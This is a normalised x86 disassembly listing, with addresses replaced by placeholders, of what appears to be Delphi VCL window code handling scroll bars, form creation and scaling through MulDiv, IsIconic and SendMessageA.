mov eax [ esi ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
sub_464ec0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44edd8
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_46433c
mov [ esi + 0x208 ] eax
push 0x1
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_46433c
mov [ esi + 0x20c ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_464f38
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_4032a8
mov eax [ esi + 0x20c ]
call sub_4032a8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44ef08
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_464f84
push ebx
mov ebx eax
mov eax ebx
call sub_450070
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax ebx
call sub_46519c
pop ebx
retn
mov edx 0x1
mov eax 0x5
call sub_40c200
test al al
jne r-xdata
mov eax ebx
call sub_4530b8
push eax
call sub_42df90
sub_464fc4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_46511c
mov ecx edi
mov edx esi
mov eax ebx
call sub_44f7b8
pop edi
pop esi
pop ebx
retn
sub_465004
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_46510c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44c278
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
mov eax ebx
call sub_4645d4
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
call sub_44fde8
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax ebx
call sub_464b24
mov eax [ ebp - 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x9 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44fdac
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44fdac
mov edx eax
mov eax [ ebp - 0x10 ]
call sub_418778
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_44bfbc
inc ebx
dec esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465113
mov eax [ ebp - 0x10 ]
call sub_4032a8
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_46441c
push 0x0
mov edx ebx
mov eax [ ebp - 0x10 ]
call sub_4188d4
xor ecx ecx
mov edx 0xb03e
call sub_44da78
inc ebx
dec esi
jne r-xdata
sub_465140
push ebx
mov ebx eax
cmp dl [ ebx + 0x210 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x210 ] dl
test dl dl
je r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_464c74
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_464c74
mov eax ebx
call sub_46511c
jmp r-xdata
sub_46519c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4533bc
test al al
je r-xdata
xor eax eax
push ebp
push sub_465287
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_46473c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_46473c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov cl 0x1
xor edx edx
call sub_464da8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
mov dl 0x1
call sub_464da8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
xor edx edx
call sub_464da8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_464da8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov cl 0x1
xor edx edx
call sub_464da8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_464da8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_4652ac
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov edi esp
test esi esi
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x208 ]
movzx eax [ eax + 0x1a ]
sub [ edi ] eax
add [ edi + 0x8 ] eax
mov eax [ ebx + 0x20c ]
movzx eax [ eax + 0x1a ]
sub [ edi + 0x4 ] eax
add [ edi + 0xc ] eax
lea ecx [ esp + 0x18 ]
mov edx edi
mov eax esi
call sub_44c38c
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_44c3b8
mov eax [ esp + 0x10 ]
mov [ edi ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0x4 ] eax
lea ecx [ esp + 0x18 ]
lea edx [ edi + 0x8 ]
mov eax esi
call sub_44c38c
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_44c3b8
mov eax [ esp + 0x10 ]
mov [ edi + 0x8 ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0xc ] eax
mov esi [ edi ]
test esi esi
jge r-xdata
mov eax ebx
call sub_44c278
mov ebp [ edi + 0x8 ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x208 ]
mov edx [ eax + 0xc ]
add edx esi
call sub_464b24
jmp r-xdata
mov esi [ edi + 0x4 ]
test esi esi
jge r-xdata
mov eax ebx
call sub_44c278
sub ebp esi
cmp eax ebp
jge r-xdata
mov eax ebx
call sub_44c2bc
mov ebp [ edi + 0xc ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
add edx esi
call sub_464b24
jmp r-xdata
mov esi [ ebx + 0x208 ]
mov eax ebx
call sub_44c278
mov edx [ esi + 0xc ]
add edx [ edi + 0x8 ]
sub edx eax
mov eax esi
call sub_464b24
mov eax ebx
call sub_44c278
add eax [ edi ]
mov [ edi + 0x8 ] eax
mov eax ebx
call sub_44c2bc
sub ebp esi
cmp eax ebp
jge r-xdata
mov esi [ ebx + 0x20c ]
mov eax ebx
call sub_44c2bc
mov edx [ esi + 0xc ]
add edx [ edi + 0xc ]
sub edx eax
mov eax esi
call sub_464b24
mov eax ebx
call sub_44c2bc
add eax [ edi + 0x4 ]
mov [ edi + 0xc ] eax
sub_465400
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
cmp edi esi
je r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x0
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x0
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_464b24
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_464b24
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x1
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x1
mov ebp [ ebx + 0x208 ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
mov ebp [ ebx + 0x20c ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_464c74
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_464c74
sub_4654a4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_465400
mov ecx edi
mov edx esi
mov eax ebx
call sub_452bc4
pop edi
pop esi
pop ebx
retn
sub_4654cc
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
inc [ eax + 0x214 ]
xor edx edx
push ebp
push sub_465536
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4516a4
xor eax eax
mov edx [ ebx + 0x4 ]
sub edx 0x1
jb r-xdata
xor eax eax
jmp r-xdata
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46553d
mov eax [ ebp - 0x4 ]
dec [ eax + 0x214 ]
retn
mov al 0x1
jmp r-xdata
dec edx
je r-xdata
mov al 0x2
jmp r-xdata
sub_46553d
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_465575
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_46511c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46557c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_46557c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_46519c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
sub_4655f0
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_44c2bc
mov edx [ ebx + 0x20c ]
mov edx [ edx + 0x10 ]
call sub_42be9c
push eax
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_44c278
mov edx eax
mov edi [ ebx + 0x208 ]
mov eax [ edi + 0x10 ]
call sub_42be9c
mov ecx eax
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
neg edx
mov eax [ edi + 0xc ]
neg eax
call sub_4172c0
push esi
mov edi esi
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx esi
mov eax ebx
call sub_44f124
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_465660
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4656c1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_403434
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_452434
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4656c8
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x4 ] edx
retn
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4 ] 0x1
sub_4656f0
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
xor ebx ebx
mov [ ebp - 0x114 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_465854
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_465834
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov ecx ebx
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xe0 ]
mov eax [ ebp - 0x4 ]
call sub_4031f0
cmp eax [ r-xdata ]
je r-xdata
add esp 0xfffffff0
call sub_40360c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46583b
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x1
xor eax eax
push ebp
push sub_4657fc
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_418508
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfe
retn
lea edx [ ebp - 0x110 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4031f8
lea eax [ ebp - 0x110 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x114 ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x114 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba0c
call sub_403a74
sub_46587c
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
test [ ebx + 0x2f4 ] 0x20
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd4 ]
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_4034a4
and [ ebx + 0x2f4 ] 0xdf
sub_4658b4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_464ec0
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
xor edx edx
mov eax ebx
call sub_44bfbc
xor edx edx
mov eax ebx
call sub_44bfe0
mov edx 0x140
mov eax ebx
call sub_44c008
mov edx 0xf0
mov eax ebx
call sub_44c02c
mov dl 0x1
mov eax [ r-xdata ]
call sub_42b3e0
mov esi eax
mov [ ebx + 0x240 ] esi
push 0x31
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x32
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax [ ebx + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebx + 0x240 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_4661d0
mov dl 0x1
mov eax [ r-xdata ]
call sub_424e50
mov esi eax
mov [ ebx + 0x238 ] esi
mov eax esi
mov edx ebx
call sub_44b428
mov al [ r-xdata ]
mov [ ebx + 0x228 ] al
mov [ ebx + 0x229 ] 0x2
mov [ ebx + 0x22b ] 0x0
mov [ ebx + 0x231 ] 0x3
mov [ ebx + 0x244 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ ebx + 0x25c ] eax
mov [ ebx + 0x235 ] 0x1
mov eax ebx
call sub_4031f0
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x2e1 ] 0xff
xor eax eax
mov [ ebx + 0x2ec ] eax
xor edx edx
mov eax ebx
call sub_466534
xor edx edx
mov eax ebx
call sub_44ca38
xor edx edx
mov eax ebx
call sub_44c9a0
mov dl 0x1
mov eax ebx
call sub_4531f8
mov edx ebx
mov eax [ rw-data ]
call sub_46ab98
mov [ ebx + 0x2e4 ] 0xa
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_465a2d
add [ eax ] al
add [ ebx - 0x75 ] dl
fsub [ ecx + rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov eax ebx
call sub_4211e8
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
mov edx ebx
call sub_418a70
xor edx edx
mov eax ebx
call sub_41bfe0
cmp [ ebx + 0x264 ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0xc ]
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
mov eax ebx
call sub_469a40
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
sub_465a98
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_403674
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
xor eax eax
push ebp
push sub_465b62
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4683bc
mov eax [ ebp - 0x4 ]
call sub_4533bc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd8 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_46abd0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_4032a8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
call sub_4032a8
mov eax [ ebp - 0x4 ]
add eax 0x2f0
call sub_40d4f0
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_464f38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465b69
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xac ]
sub_465b7c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2d2 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
xor eax eax
push ebp
push sub_465bbd
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_466534
sub_465bc2
mov eax [ ebp - 0x4 ]
mov si 0xffad
call sub_4034a4
test al al
jne r-xdata
call sub_403af0
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
call sub_403a9c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_466534
sub_465bf8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2da ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_465c39
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2dc ]
call [ ebx + 0x2d8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_465c58
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_44e980
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi eax
xor eax eax
mov [ ebx + 0x220 ] eax
mov eax edi
mov si 0xffb8
call sub_4034a4
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_467f00
sub_465c94
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_44bd1c
mov eax ebx
sub al 0x1
jb r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
je r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
cmp [ edi + 0x2f0 ] 0x0
jne r-xdata
mov ebp [ edi + 0x2f0 ]
test ebp ebp
je r-xdata
jmp r-xdata
cmp [ edi + 0x250 ] 0x0
je r-xdata
cmp [ edi + 0x248 ] 0x0
jne r-xdata
mov edx esi
mov eax [ edi + 0x2f0 ]
call sub_418778
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ edi + 0x2f0 ] eax
cmp esi [ edi + 0x248 ]
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
mov eax [ edi + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp edi [ esi + 0x4 ]
jne r-xdata
cmp esi [ edi + 0x258 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_4672f8
mov edx esi
mov eax ebp
call sub_418a70
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
cmp esi [ edi + 0x260 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_4672d0
mov edx esi
mov eax edi
call sub_4672f8
jmp r-xdata
xor edx edx
mov eax edi
call sub_4672ac
sub_465da0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44f950
xor edx edx
push ebp
push sub_465ff6
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x268 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x26c ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x270 ] edx
xor ebx ebx
mov al [ rw-data ]
xor al 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x234 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44f0ac
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x25c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x270 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
test eax eax
jle r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44c290
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ r-xdata ]
mov [ eax + 0x98 ] dl
test bl bl
jne r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44c2d4
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x25c ] eax
mov eax [ ebp - 0x4 ]
call sub_466128
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
cmp esi eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
mov edx [ rw-data ]
cmp eax [ edx + 0x40 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_44da78
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465ffd
mov eax [ ebp - 0x4 ]
call sub_44f958
retn
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_465400
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_452b7c
mov bl 0x1
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_465400
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_452b7c
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x68 ]
mov eax esi
call sub_424684
push eax
call MulDiv
mov edx eax
mov eax esi
call sub_42468c
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x268 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_466005
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4503f8
push 0x0
push 0x0
push ebx
push sub_46610c
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_4660d8
push ebx
push sub_4660f0
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push r-xdata
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
retn
sub_4660b7
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_41c6d8
test al al
je r-xdata
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_44c9a0
sub_466143
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add bl al
lea eax [ eax ]
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_465400
mov ecx edi
mov edx esi
mov eax ebx
call sub_452b7c
mov eax ebx
call sub_46622c
test al al
je r-xdata
push edi
push esi
mov ebp [ ebx + 0x68 ]
mov eax ebp
call sub_424728
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_424744
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_44c2bc
mov ebp eax
push edi
push esi
mov eax ebx
call sub_44c278
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_4664d4
push edi
push esi
push ebp
call MulDiv
mov edx eax
mov eax ebx
call sub_466504
sub_4661d0
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_4530b8
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_4533bc
test al al
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_468530
push eax
push 0x1
push 0x80
mov eax ebx
call sub_4530b8
push eax
call SendMessageA
pop ebx
retn
sub_466264
push ebx
mov ebx eax
mov eax ebx
call sub_467180
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov al [ ebx + 0x229 ]
sub al 0x2
je r-xdata
mov al 0x1
sub al 0x3
je r-xdata
mov al 0x1
pop ebx
retn
xor eax eax
jmp r-xdata
cmp al [ ebx + 0x210 ]
jne r-xdata
sub_4662f8
push ebx
push esi
mov esi edx
